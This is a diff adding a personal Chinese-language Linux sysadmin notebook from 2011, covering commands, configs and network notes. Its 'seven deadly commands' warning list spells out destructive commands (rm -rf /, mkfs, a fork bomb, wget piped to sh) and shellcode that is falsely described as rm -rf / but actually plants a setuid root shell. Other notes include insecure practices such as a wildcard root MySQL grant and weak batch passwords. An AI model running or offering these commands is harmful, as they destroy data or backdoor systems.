@@ -1,0 +1,2882 @@
+﻿
+--------------2011.06.23-------------
+arp攻击查看
+arp -a
+--------------2011.06.24--------------
+crontab
+
+每月每天每小时的第 0 分钟执行一次 /bin/ls : 　　0 * * * * /bin/ls 　　在 12 月内, 每天的早上 6 点到 12 点中，每隔 20 分钟执行一次 /usr/bin/backup : 　　*/20 6-11 * 12 * /usr/bin/backup 　　周一到周五每天下午 5:00 寄一封信给 alex@domain.name : 　　0 17 * * 1-5 mail -s "hi" alex@domain.name < /tmp/maildata 　　每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分....执行 echo "haha" 　　20 0-23/2 * * * echo "haha" 　　晚上11点到早上8点之间每两个小时，早上8点 　　0 23-7/2，8 * * * date 　　在hp unix,中，每20分钟执行一次，表示为：0,20,40 * * * * 而不能采用*/n方式，否则出现语法错误 
+
+
+2002-2011 初中、高中、大学，曾经，深夜里红警、星际、cs。曾经，传世中攻沙、打宝、行会战。曾经兄弟情，曾经屏中缘，曾经qq恋。曾经，懵懂的少年开始了奔三的生活。曾经，至亲的兄弟以天各一方。曾经，美丽的姑娘成为了别人的新娘。曾经的曾经的曾经......回忆，还念，内牛满面。谢谢你的陪伴--oicq
+
+--------------2011.06.28------------
+ps aux |grep php-cgi|wc -l
+
+服务器 安全
+
+php 运行在 safe mode
+
+sql参数传入没有过滤完全
+sql语句写得不严谨的原因吧
+你目前一是把DB删掉一些系统存储过程，一是想办法先在页面中加代码，过滤掉多余的不正规的输入内容
+
+ngx_http_secure_link_module.
+location /p/ {
+    secure_link_secret   some_secret_word;
+    if ($secure_link = "") {
+        return 403;
+    }
+}
+
+编译时 加入
+--with-http_secure_link_module
+
+------------2011.06.30---------------
+chmod 
+　u：User，即文件或目录的拥有者。 　　g：Group，即文件或目录的所属群组。 　　o：Other，除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围。 　　a：All，即全部的用户，包含拥有者，所属群组以及其他用户。 　　有关权限代号的部分，列表于下： 　　r：读取权限，数字代号为"4"。 　　w：写入权限，数字代号为"2"。 　　x：执行或切换权限，数字代号为"1"。 　　-：不具任何权限，数字代号为"0"。 　　s：特殊?b>功能说明：变更文件或目录的权限。
+
+ulimit -n 65535
+dmidecode -t memory
+
+进程控制
+
+#查看80端口的tcp连接
+
+#netstat -tan | grep "ESTABLISHED" | grep ":80" | wc -l
+
+
+#当前WEB服务器中联接次数最多的ip地址:
+
+#netstat -ntu |awk '{print $5}' |sort | uniq -c| sort -n -r
+
+--------------2011.07.01-------------------
+为linux而生，为负载能力而死，为系统优化奋斗一辈子! 吃dba亏，上程序员当，最后死在宕机上! 为apache而生，为虚拟化而死，为上司老板收拾烂摊子！被微软忽悠，让红帽诱骗，恨LAMP跑在山寨机上。。。。杯具！杯具！杯具！杯具的运维
+
+api  chart.page.php  commons.php  data  house   mycenter  office    rent  shop    themes   wap app  common.php      config       home  manage  news      passport  sell  static   www
+
+------------2011.07.05----------------------
+lsmod  查看 引用模块
+
+------------2011.07.13------------------------
+ac -p 显示每个登陆用户的总是时间 -d 一天的连接时间
+last -5  显示最近登陆的 信息
+lastlog 显示每个用户的最后登陆时间
+
+------------2011.07.14------------------------
+iftop -i eth0
+yum install bmon
+ntsysv  系统服务配置
+mount --bind olddir newdir
+
+------------2011.07.18--------------------
+查看cgi是否够用
+netstat -anpo|grep "php-cgi"|wc -l
+多少人在线
+netstat -an|awk '/tcp/ {print $6}'|sort|uniq -c
+
+1、复制远程服务器的文件到本地：
+scp -P888 root@120.18.50.33:/data/ha97.zip /home/
+2、复制远程服务器的目录到本地：
+scp -vrp -P888 root@120.18.50.33:/data/ha97/ /home/
+3、复制本地的文件到远程服务器：
+scp -P888 /home/ha97.zip root@120.18.50.33:/data/
+4、复制本地的目录到远程服务器：
+scp -vrp -P888 /home/ root@120.18.50.33:/data/
+
+五元组是:
+         源IP地址、目的IP地址、协议号、源端口、目的端口
+七元组是:
+         源IP地址、目的IP地址、协议号、源端口、目的端口，服务类型以及接口索引
+
+-------------2011.07.20------------
+生成随即密码
+date +%s | sha256sum | base64 | head -c 32 ; echo
+openssl rand -base64 32
+randpw(){ < /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-16};echo;}
+date | md5sum 
+mkpasswd  需要  yum install expect
+
+------------2011.07.20-----------
+date +%Y%m%d --date='5 days ago'  5天前
+date +%Y%m%d- %H%M%S 时分秒
+yum install yum-fastestmirror
+
+
+------------2011.07.23------
+CLOSED：无连接是活动的或正在进行
+　　LISTEN：服务器在等待进入呼叫
+　　SYN_RECV：一个连接请求已经到达，等待确认
+　　SYN_SENT：应用已经开始，打开一个连接
+　　ESTABLISHED：正常数据传输状态
+　　FIN_WAIT1：应用说它已经完成
+　　FIN_WAIT2：另一边已同意释放
+　　ITMED_WAIT：等待所有分组死掉
+　　CLOSING：两边同时尝试关闭
+　　TIME_WAIT：另一边已初始化一个释放
+　　LAST_ACK：等待所有分组死掉
+减少超时时间
+
+
+-------------2011.07.28-------
+dmesg |grep Vendor   查看硬件raid 信息
+
+-------------2011.07.28--------
+
+shell 编程的最好理解
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=557&fromuid=2
+两个很详细的shell 实例
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=558&fromuid=2
+将PHP作为Shell脚本语言使用
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=559&fromuid=2
+shell编程例子 -- 一个简单的目录菜单
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=561&fromuid=2
+shell编程例子 -- 一个.cshrc例子
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=562&fromuid=2
+shell编程例子 -- 一个makefile例子
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=563&fromuid=2
+shell - 执行脚本
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=564&fromuid=2
+虚拟化技术
+XEN虚拟机在CentOS5下的安装和配置
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=338&fromuid=2
+VMware VI3虚拟机热备份的几种方法
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=329&fromuid=2
+怎样搭建服务器虚拟化
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=335&fromuid=2
+Liunx虚拟化VPS服务器配置
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=216&fromuid=2
+实现存储虚拟化的三种方式：基于主机的方式
+ttp://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=327&fromuid=2
+VMware中创建集群
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=321&fromuid=2
+中小企业如何部署虚拟化
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=316&fromuid=2
+如何使用vzdump克隆/备份/恢复OpenVZ虚拟机
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=242&fromuid=2
+OpenVZ+CentOS 5.4+Vtonf自建VPS服务器的方法
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=237&fromuid=2
+openvz+vps+ubuntu下安装openvpn并配置iptables防火墙
+http://www.linuxqd.com/bbs/forum.php?mod=viewthread&tid=236&fromuid=2
+
+-----------------2011.08.03-----------
+nfs  需要用的进程 portmap
+开机自动挂载硬盘  /etc/fstab
+
+-----------------2011.08.05--------------
+ssh 传东西  ssh-copy-id -i .ssh/id_rsa.pub ip然后直接输入密码 搞定
+
+-----------------2011.08.08------------
+jawstats  日志分析工具 
+nginx最简单的防盗链设置如下
+
+location ~* .(gif|jpg|png|swf|flv)$ {
+    valid_referers none blocked www.dooda.net;
+    if ($invalid_referer) {
+        return 403;
+    }
+}
+我擦。。。
+
+----------------2011.08.09-----------------
+
+IE6的话，下载图片是2个并发的
+IE8好点，是4个并发
+
+e2fsprogs ext4 支持包
+
+----------------2011.08.10-----------------
+
+ldconfig -v | grep libxml
+系统版本 cat /etc/issue
+
+----------------2011.08.12--------------------
+> > 我想了解一些有關網路的運作架構之類的
+> > 希望大家能推薦有關的書
+> > 謝謝ㄌㄡ
+>
+> 一﹐先看如下兩本﹕
+> 《精通區域網路》(Mastering Local Area Network) 儒林 (SYBEX) 翻譯出版
+> 《TCP/IP 通訊協定入門與應用》博碩文化出版
+>
+> * 這裡﹐基本上要能蓋起書本回答如下問題﹕
+> 1) 什麼是網路﹖(LAN/WAN/MAN/Internet)
+> 2) 有哪些 Topologies﹖(BUS/Star/Ring)
+> 3) Network Media 有哪些﹖(Coaxial, UTP/STP, FiberOptic, Wireless, etc.)
+> 4) Major NOS (Network Operating System)
+> 5) Peer-to-Peer 和 Client/Server
+> 6) Protocol Binding 概念 (Netbios, TCP/IP, IPX/SPX)
+> 7) OSI Layer 基本概念
+> 8) Encapsulation / Decapsulation 概念
+> 9) BaseBand / BroadBand communication ( TDM / FDM )
+> 10) CSMACD / Token Bus / Token Ring (IEEE 802.3, 802.4, 802.5)
+ 11) ARP/RARP, IP, TCP 基本概念
+> 12) IP Subneting / IP Routing 基本概念
+> 13) 區分 repeater, HUB, bridge, switch, router, gateway 等設備
+>
+>
+> 看完上面兩本後﹐再思考一下﹕
+> 如果覺得沒興趣﹐到這裡就要停了﹐否則再下去的話﹐萬劫不復﹗
+>
+> 二﹐如果覺得有興趣繼續﹐那再參考如下的﹕
+> TCP/IP Illustrated -- the protocols ﹐學貫(或其它)翻譯出版
+> TCP/IP 互連網路 Principles, Protocols, and Architecture , 全華(或其它)翻譯出版
+>
+> * 這裡﹐您需要搞清楚﹕
+> 1) ARP/RARP/Proxy ARP
+> 2) IP header & TCP header 的每一個欄位(能知道其 offset 和每一個 bit 的含義)﹐以
+> 及各欄位的始止範圍(最基本能用 byte 來算)
+> 3) IP subneting / Superneting (CIDR, VLSM)
+> 4) IP routing (RIP, OSPF, IGP, BGP, etc.)
+> 5) TCP/UDP (Connection Oriented/Connectionless, SeqNum/AckNum, Sliding Window,
+> Three-way-handshake, etc.)
+> 6) Socket & Socket Pair
+ 7) MTU/MRU/MSS/RWIN﹐TOS
+> 8) ICMP (type, error code)
+> 9) TCP/IP Applications (telnet, http, ftp, etc﹐要清楚他們的連線特性﹐如 ftp 的
+> control & data channels, active & passive modes)
+>
+>
+> 三﹐連這關也過了﹐那要看的書應該就更多了﹐但基本的要包括﹕
+> PPP
+> DHCP
+> DNS
+> email
+>
+>
+> * 這裡﹐基本要知道的﹕
+> 1) PPP 之 AT commands﹐LCP/NCP/IPCP, PAP/CHAP, etc.
+> 2) DHCP 之 bootp, discover, offer, request, ack/nack, lease, DHCP relay, etc.
+> 3) DNS 的 delegation & query﹐zone transfer, SOA & MX RR, etc.
+> 4) email system 的 MTA/MUA﹐mail headers, relay, forward, masquerade, etc.
+>
+>
+> 四﹐再來﹐挑自己有興趣的專注面來看就好﹐例如﹕
+> Cisco Router 設定
+> Cisco switching 技術
+> SNMP 管理
+> VPN 網路管理
+> Firewall / NAT 設定和管理
+>
+>
+> * 這裡﹐以及下面的﹐要了解的實在太多﹐不列舉了﹐自己慢慢找吧。
+>
+>
+> 五﹐等基礎打好了﹐就看您喜歡什麼樣的作業平臺了﹕
+> Microsoft Windows Network
+> Novell Network
+> Apple Network
+> Unix Family / Linux
+> SNA / Mainframe
+> etc. ...
+>
+ 六﹐再來是應用軟體的開發﹕
+> VB / Perl
+> Socket Programing
+> xSQL / Oracel
+> PHP / ASP
+>
+>
+> ****** 
+
+--------------------2011.08.13-----------
+
+tracert + ping = mtr
+
+-------------------2011.08.15-------------
+CloneZilla linux克隆工具
+
+-------------------2011.08.16--------------
+批量改密码
+
+useradd peixun$iecho "123456"|passwd --stdin peixun$i &> /dev/null
+
+-------------------2011.08.17-------------
+sniffer  抓包工具
+
+-------------------2011.08.19--------------
+list="#xxxxxx"
+if [ ${list:0:1} != "#"  ]
+0表示从第几个字符下表开始，1表示取多长
+所以上面就是取字符串的第一个字符判断是不是#
+
+
+-------------------2011.08.22--------------
+
+paste 是linux 命令 　　用途 　　从一个或多个文件中连接行。 　　语法 　　paste [ -s ] [ -d List ] File1 ... 　　
+bash -ax  bash vx debug 下也行 测试 shell 一步一步执行
+
+牛B、装B、傻B的区别 一、牛B的永远是少数，装B的普遍存在，傻B则满山遍野到处是。二、牛B的不在乎开车还是走路，装B的出门必开宝马，傻B的开吉利美人豹。三、牛B需要相处一段时间才会觉得牛B，装B一开始觉得牛B，时间长了才知是装B，傻B的一见面就感觉很傻B
+
+-------------------2011.08.25---------------
+nc -v -z www.baidu.com 80 判断一个端口是否打开
+
+1.rm -rf / 此命令将递归并强制删除 / 目录下的所有文件。
+2. char esp[] __attribute__ ((section(".text"))) /* e.s.p
+  release */
+  = "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
+  "\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
+  "\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
+ "\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
+  "\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
+  "\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
+  "\x6e\x2f\x73\x68\x00\x2d\x63\x00"
+  "cp -p /bin/sh /tmp/.beyond; chmod 4755
+  tmp/.beyond;";
+  这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。
+3.mkfs.ext3 /dev/sda 这将对硬盘进行重新格式化，自然，硬盘上的所有数据将灰飞烟灭。
+4.:(){ :|:& };: 著名的 fork 炸弹，此命令将告诉你的系统执行海量的进程，直到你的系统僵死。
+5.any_command > /dev/sda 使用该命令，原始数据将被写到块设备，其结果是造成数据丢失。
+6.wget http://some_untrusted_source -O- | sh 不要从不信任的地方下载东西，这可能会获取恶意代码。
+7.mv /home/yourhomedirectory/* /dev/null 此命令将移动主目录中的所有文件到一个不存在的地方，你将再也看不到那些文件。
+linux下 七个致命的命令------
+
+-------------------2011.09.01-------------------------
+
+convmv -r -f gb2312 -t UTF-8 *  字符转
+svn merge 最新的URL路径 你的当前分支的URL路径
+
+-------------------2011.09.07------------------------
+sed 匹配首行不是 #  ^[^#]
+
+-------------------2011.09.08------------------------
+
+mysql>source d:/wcnc_db.sql
+
+-------------------2011.09.10-----------------
+
+1、smartctl -a  <device>         检查该设备是否已经打开SMART技术。2、smartctl -s on <device>    如果没有打开SMART技术，使用该命令打开SMART技术。3、smartctl -t short <device>    后台检测硬盘，消耗时间短；      smartctl -t long <device>      后台检测硬盘，消耗时间长；      smartctl -C -t short <device> 前台检测硬盘，消耗时间短；      smartctl -C -t long <device>  前台检测硬盘，消耗时间长。其实就是利用硬盘SMART的自检程序。4、smartctl -X <device>  中断后台检测硬盘。5、smartctl -l selftest <device>  显示硬盘检测日志。6、smartctl -l error <device> 显示硬盘错误汇总。
+
+------------------------2011.09.30-----------------------------
+MSR30-20 限速
+[Quidway] qos carl 1 source-ip-address range 192.168.1.30 to 192.168.1.90 per-address
+[Quidway]  qos carl 2 destination-ip-address range 192.168.1.30 to 192.168.1.90 per-address 
+[Quidway] qos carl 3 source-ip-address range 192.168.1.101 to 192.168.1.112 per-address 
+[Quidway]  qos carl 4 destination-ip-address range 192.168.1.101 to 192.168.1.112 per-address 
+[Quidway] interface ethernet 0/1
+[Qudiway-Ethernet0/1] qos car inbound carl 1 cir 500 cbs 750000 ebs 0 green pass red discard   //上传500k
+[Qudiway-Ethernet0/1] qos car outbound carl 2 cir 2000 cbs 3000000 ebs 0 green pass red discard //下载2M
+
+ESTABLISED: 已建立练级的状态
+SYN_SENT:   发出主动联机（SYN标志）的联机数据包
+SYN-RECV:   接收到得一个要求联机的主动联机数据包
+FIN_WAIT1： 该联机这在断线当中
+FIN_WAIT2： 该联机已挂断，但正在等待对方主机相应断线确认的数据包
+TIME_WAITE: 该联机已挂断，但socket还在网络山等待结束
+
+java环境配置
+JAVA_HOME=/usr/share/jdk1.5.0_05
+PATH=$JAVA_HOME/bin:$PATH
+CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar
+export JAVA_HOME
+export PATH
+export CLASSPATH
+080027ed3211
+
+dstat整合了vmstat, iostat, ifstat, netstat等常见os监控工具的优点
+
+
+#!/bin/bash
+echo "Please input some words:"
+read WORD
+INFO=`ps -ef | grep $WORD |awk  '{print $2,$8}'`
+PID=`ps -ef | grep $WORD |awk  '{print $2}'`
+for inf in $INFO
+do
+    echo $inf 
+done
+
+echo "Plesase input y/n:"
+read a
+case $a in
+y|Y)
+    for i in $PID
+    do
+        kill $i
+        echo $i
+    done
+;;
+*)
+    exit 0
+esac
+
+------------------------2011.10.09------------------------
+Squirrelmail 袋鼠邮局
+
+------------------------2011.10.10------------------------
+#netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}' 
+
+TIME_WAIT 17
+ESTABLISHED 3254
+LAST_ACK 236
+FIN_WAIT_1 648
+FIN_WAIT_2 581
+CLOSING 7
+CLOSE_WAIT 4916
+
+解析：
+CLOSED  //无连接是活动的或正在进行
+LISTEN  //服务器在等待进入呼叫
+SYN_RECV  //一个连接请求已经到达，等待确认
+SYN_SENT  //应用已经开始，打开一个连接
+ESTABLISHED  //正常数据传输状态/当前并发连接数
+FIN_WAIT1  //应用说它已经完成
+FIN_WAIT2  //另一边已同意释放
+ITMED_WAIT  //等待所有分组死掉
+CLOSING  //两边同时尝试关闭
+TIME_WAIT  //另一边已初始化一个释放
+LAST_ACK  //等待所有分组死掉
+
+------------------------2011.10.11----------------------------
+redhat-release 更改版本号
+
+xclock
+export DISPLAY= 192.168.1.1
+xhost
+
+------------------------2011.10.13------------------------------
+rz  sz  上传保存
+awk  NR 行数 NF 列数
+光驱在linux下硬件名 scd+数字
+多文件大小统计 du -sh shell first |awk -Fk '{a[$1];b=0}{for(i in a) b+=i}END{print b}' 
+
+------------------------2011.10.14---------------------------------
+
+这个问题同iptables 内的 chain 都有点关联，我给个chain 图你参考一下吧。
+在你这问题：
+如果你是客户，在 OUTPUT 链，995 和 25 是 dport；
+　在 INPUT 链，995 和 25 是 sport。
+如果你是 Gmail 服务器，在 OUTPUT 链，995 和 25 是 sport，
+　在 INPUT 链，995 和 25 是 dport。
+
+------------------------2011.10.17--------------------------------
+awk 随机数 rand（）
+cat /dev/urandom |tr -cd 'a-z0-9A-Z' |head -c 4 生成 4位随机数
+
+------------------------2011.10.18----------------------------------
+awk '{print "echo "$0" = "$0"@`cat /dev/urandom | tr -cd 'a-z0-9A-Z' | head -c 4`"}' a | sh
+awk 生成4位随机字母
+
+makepasswd --char 4 生成四位随机数
+echo  00010343E534|sed -e 's/\(..\)/\1:/g;s/:$//'
+awk -F '' '{for(i=1;i<=NF;i+=2){printf (m++)?":"$i$(i+1):$i$(i+1)}print ""}'
+
+echo  00010343E534|awk -F '' '{for(i=1;i<=NF/2;i++){m=i*2-1;n=i*2;printf((NF/2-i)?$m$n":":$m$n"\n")}}'
+
+echo '00010343E534' | sed 's/\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)/\1:\2:\3:\4:\5:\6/'
+
+ 结果 00:01:03:43:E5:34
+
+网关查看 route -n
+
+强制位  冒险位
+
+------------------------2011.10.19------------------------------------------
+shell 访问数据库
+#!/bin/bash
+
+mysql -uvpsee -ppassword test << EOFMYSQL
+select * from test_mark;
+EOFMYSQL
+
+------------------------2011.10.24-------------------------------------------
+mii-tool 这是Linux下专门设置网卡工作模式的命 -v 详细信息  ethtool
+ifconfig |awk '/HWaddr/{split($5,m,":"); print m[2]}'   小域 分析
+ll -i 查看文件的 inode
+
+find . -inum 上个结果 -exec rm -i {} \;
+
+ sublime text 2 多功能代码编辑器
+wx有个 wx formbuilder好像叫这个
+可以生成c++/python等等
+qt就用qt designer
+
+------------------------2011.10.25-------------------------------------------
+cpu利用率 很低 内存正常 但是负载很高的时候 怎么能快速去判断是哪个呢？
+是哪个程序造成的
+vincent-天津lnfsddy(582256890)  12:59:42
+top
+按U
+在按M
+找最上面几个进程的ID
+lsof -p PID
+
+------------------------2011.10.26---------------------------------------------
+
+不同浏览器的并发连接 ie7 2个 ie8 6 个 火狐3 4 个
+网页监控 firebug httpwatch
+网站测试软件 LoadRunner 运行在用户pc上  jmeter
+
+------------------------2011.10.27---------------------------------------------
+cacti 可以了解 php opcode 缓存情况
+
+keepalive  互换
+#!/bin/sbin/
+VIP=192.168.2.254
+workdir="/etc/keepalived "
+cd $workdir
+if [ ! -f switch.pid ]; then
+        echo 'undef' > switch.pid
+fi
+backup() {
+       cd $workdir
+       backup=" $(cat switch.pid) "
+        ip ad sh eth0|grep " $VIP/32 " 2>&1 >> /dev/null && ip addr del local $VIP/32 dev eth0 2>&1 >> /dev/null
+        echo "1111111111"
+if [ $backup != "backup" ]; then
+        echo "1111111111"
+        ln -sf keepalived.conf.switch-backup keepalived.conf
+        /sbin/ipvsadm -C
+        echo 'backup' > switch.pid
+        /etc/init.d/keepalived reload
+        echo "switch to backup $(date + "%Y - %m - %d %H : %M : %S")" >> switch.log
+else
+        exit 0
+fi
+}
+
+
+shell 加密 aes
+
+    local host
+     +---------+
+    /         /| 
+   +---------+ |
+   |         | |
+   |  master | |
+   |  files  | |
+   |         |/
+   +---------+
+
+-----------------------------------2011.10.28--------------------------
+iftop 监控网口情况
+
+　RISC 和CISC 是目前设计制造微处理器的两种典型技术，虽然它们都是试图在体系结构、操作运行、软件硬件、编译时间和运行时间等诸多因素中做出某种平衡，以求达到高效的目的，但采用的方法不同，因此，在很多方面差异很大，它们主要有： 　　（1） 指令系统：RISC 设计者把主要精力放在那些经常使用的指令上，尽量使它们具有简单高效的特色。对不常用的功能，常通过组合指令来完成。因此，在RISC 机器上实现特殊功能时，效率可能较低。但可以利用流水技术和超标量技术加以改进和弥补。而CISC 计算机的指令系统比较丰富，有专用指令来完成特定的功能。因此，处理特殊任务效率较高。 　　（2） 存储器操作：RISC 对存储器操作有限制，使控制简单化；而CISC 机器的存储器操作指令多，操作直接。 　　（3） 程序：RISC 汇编语言程序一般需要较大的内存空间，实现特殊功能时程序复杂，不易设计；而CISC 汇编语言程序编程相对简单，科学计算及复杂操作的程序设计相对容易，效率较高。 　　（4） 中断：RISC 机器在一条指令执行的适当地方可以响应中断；而CISC 机器是在一条指令执行结束后响应中断。 　　（5） CPU：RISC CPU 包含有较少的单元电路，因而面积小、功耗低；而CISC CPU 包含有丰富的电路单元，因而功能强、面积大、功耗大。 　　（6） 设计周期：RISC 微处理器结构简单，布局紧凑，设计周期短，且易于采用最新技术；CISC 微处理器结构复杂，设计周期长。 　　（7） 用户使用：RISC 微处理器结构简单，指令规整，性能容易把握，易学易用；CISC微处理器结构复杂，功能强大，实现特殊功能容易。 　　（8） 应用范围：由于RISC 指令系统的确定与特定的应用领域有关，故RISC 机器更适合于专用机；而CISC 机器则更适合于通用机。
+
+
+debugfs /dev/sda1  删除数据恢复 lsdel
+
+sql 语句 分析 explain＋sql 语句
+
+#!/bin/bash#Used to auto fdisk and format disk#Write by junlee#2010-04-23PATH=/bin:/sbin:/usr/bin:/usr/sbinexport PATHi=1while [ $i -lt 24 ]do                j=`echo $i|awk '{printf "%c",97+$i}'`                fdisk /dev/sd$j <<Endnp1wEnd                mkfs.ext3    /dev/sd${j}1                let i+=1done自动分区脚本
+
+眼保健操 眼保健操：(→_→)( ↑ _ ↑ )(←_←)( ↓ _ ↓ )(→_←)( ↑ _  ↓ ) (←_→)( ↓ _ ↑ ) ！！！！！
+
+243
+
+---------------------------------2011.10.31-----------------------------------
+mysql 远程访问  GRANT ALL ON *.* TO root@'%' IDENTIFIED BY 'zzzzzzz' WITH GRANT OPTION; 
+
+---------------------------------2011.11.02-----------------------------------
+流量控制软件 panabit
+
+---------------------------------2011.11.08------------------------------------
+io 吞吐测试软件   sysbench
+防火墙  monowall
+
+28104153
+
+---------------------------------2011.11.09----------------------------------------
+awk '{if(a[$1$2]<$6){a[$1$2]=$6;b[$1$2]=$0}}END{for(i=0;i++<asorti(a,c);)print b[c[i]]}'
+asort 对数组小标 排序  length 统计数组长度
+
+就算我们有6W用户 而有效用户为80%，每天在线的用户 占有效用户的20%，那么每天有8个小时，每个小时在线用户为1200人，如果每个人每天在线时间少于半个小时，那么在线用户为600人。  每个人平均点击30次，那么600*30=18000次/小时，即系统每秒惦记为 5 次/秒假如峰值是平均值的 4倍，那么就是5*4=20次/秒   那么可能发生的并发的总数为 20-30 次
+nfsstat nfs客户端的io情况 
+
+http://software.cs.utep.edu/ISOs/CentOS/
+
+---------------------------------2011.11.10-------------------------------------
+http://pkgs.repoforge.org/rpmforge-release/  centos 三方源
+http://andrewyu.blog.51cto.com/1604432/710049    邮件服务器
+
+eduitpuls 注册码Free User   6AC8D-784D8-DDZ95-B8W3A-45TFA 
+
+---------------------------------2011.11.11---------------------------------------
+$0 这个程式的执行名字，及脚本名
+$n 这个程式的第n个参数值，n=1..9
+$* 这个程式的所有参数,此选项参数可超过9个。
+$# 这个程式的参数个数
+$$ 这个程式的PID(脚本运行的当前进程ID号)
+$! 执行上一个背景指令的PID(后台运行的最后一个进程的进程ID号)
+$? 执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)
+$- 显示shell使用的当前选项，与set命令功能相同
+$@ 跟$*类似，但是可以当作数组用
+
+---------------------------------2011.11.14------------------------------------------
+uname -m 检查系统
+
+moofs http://bbs.chinaunix.net/thread-1644309-1-1.html
+---------------------------------2011.11.21---------------------------------------
+Zimbra邮件服务软件
+awk 传参用 -v
+paste -d 并列打印两个文件
+
+---------------------------------2011.11.22----------------------------------------------
+
+安装 系统分析工具（iostat）yum install sysstat
+内存检查 systemtap
+内存带宽检测 mbw
+日志分析工具 jawstat
+mysql 监控 mycheckpoint
+
+---------------------------------2011.11.23--------------------------------------------------
+find /指定路径/*.php -mtime 0 >> /var/log/message
+python exit(0)：无错误退出
+       exit(1)：有错误退出
+路由控制软件： 海蜘蛛
+ getattr  类似 className.function
+
+---------------------------------2011.11.24----------------------------------------------------
+虚拟化 云计算 OpenStack, Eucalyptus
+
+---------------------------------2011.11.28-------------------------------------------------
+linux 版本信息 /etc/issue
+取 字符串 前九 cut -c 0-9
+linux下查看某个进程打开了多少个文件  lsof
+不错的网站 http://b.formyz.org/
+
+---------------------------------2011.11.29------------------------------------------------------
+查看 SELinux 是否关闭 sestatus 
+程序下载出错 可以 file + 文件名
+
+---------------------------------2011.11.30---------------------------------------------------
+按天统计ip webalizer
+基础命令复习
+
+---------------------------------2011.12.01--------------------------------------------------------
+win 系统信息 systeminfo
+chattr 锁文件
+ls -r 递归操作
+cobbler linux批量安装
+每5行添加 awk 'ORS=NR%5?"\n":"\n===\n"'
+批量管理 pssh  pscp   prsync   pslurp pnuke
+
+---------------------------------2011.12.02------------------------------------------------------------
+awk 验证纯数字 echo "123" |awk '{if($0 ~ /^[0-9]+$/) print $0;}'
+RJ-45各脚功能(10BaseT/100BaseTX)：1、传输数据正极 Tx+   2、传输数据负极 Tx-   3、接收数据正极 Rx+   4、未使用   5、未使用   6、接受数据负极 Rx-   7、未使用   8、未使用
+Tokyo Cabinet 是一款 DBM 数据库
+ssh 反向代理 ssh –f –N –R 10000:localhost:22 username@xxx.xxx.xxx.xxx     
+tcpproxy  反向代理 
+
+---------------------------------2011.12.06-----------------------------------
+lsof -i:22  端口号  列出端口信息
+fuser -m -v  文件   看谁在用这个文件
+top -n 1告诉top只显示一次迭代，-b  输出文本形式
+sort -u 去除重复行
+sort -t分隔符 -k域：
+
+---------------------------------2011.12.07-------------------------------------
+if [ ! -f "$users" -o ! -f "$pass" ]   中 -o = or , -a = and  与 || 和&& 等价
+mail –s “主题
+bonding 使用mode=0模式网络I/O 2Gkill只是个发信号的工具而已吧，至于接到能够被捕获的信号后，相关程序怎么处理，那是那些程序的事了
+
+---------------------------------2011.12.09--------------------------------------
+sed 's/\(^.\{2\}\)\{0,1\}\(..\)/\1:\2/g'  00ac45d5082f改成mac的带冒号的 {首先把0ac45d5082f读进模式空间然后匹配0ac4，在0a和c4中间加上:然后就只匹配5d，在5d前面加上:因为有^号，所以\1就匹配空了后面差不多就这样，匹配2个字符，在前面加上:}
+free |awk '/M/{print "used="$3/$2*100"%","free="$4/$2*100"%"}' 内存百分比
+日志分析工具  http://piwik.org/
+*gp#ud*e*jf#c这个是原文件 想要得到的效果是：*gpejf#udawk '{a[NR]=$0}END{m=1;n=1;for(i=1;i<=NR;i++){if(a[i]=="*"){for(j=i+1;;j++) {b[m++]=a[j];if(a[j+1]=="#"||a[j+1]=="*")break;i=j}}else if(a[i]=="#"){for(j=i+1;;j++) {c[n++]=a[j];if(a[j+1]=="#"||a[j+1]=="*"||a[j+1]=="")break}}}print "*";for(i=1;i<m;i++)print b[i];print "#";for(i=1;i<n;i++)print c[i]}
+
+---------------------------------2011.12.10-----------------------------------------
+KeePass 管理密码的工具
+pssh 集中管理工具
+awk 多字符 分割 |
+sed -e :a -e 's/^.\{1,78\}$/ &/;ta' 假设有 123第一次123->空格123,因为发生替换了 t跳转到a处。第二次：空格123->空格空格123，因为发生替换了 t跳转到a处。重复重复。。123+空格 一直有 78个为止。读入下一行处理
+wsed sed 调试工具
+echo "00ac45d5082f" | sed -r 's/(^..){0,1}(..)/\1:\2/g'  不需要 \        echo "00ac45d5082f" | sed -r 's/..\B/&:/g' 我写那个 \B 是加上边界  “不在字边界时为真” 如果匹配到了边界 比如非"字"字符 情况 就不会替换 跟\b 是相反的 就是这个情况 多体会下 再不懂 我也没办法鸟
+lsof -c  加进程名
+
+---------------------------------2011.12.15-----------------------------------------
+华赛 天秦 防火墙
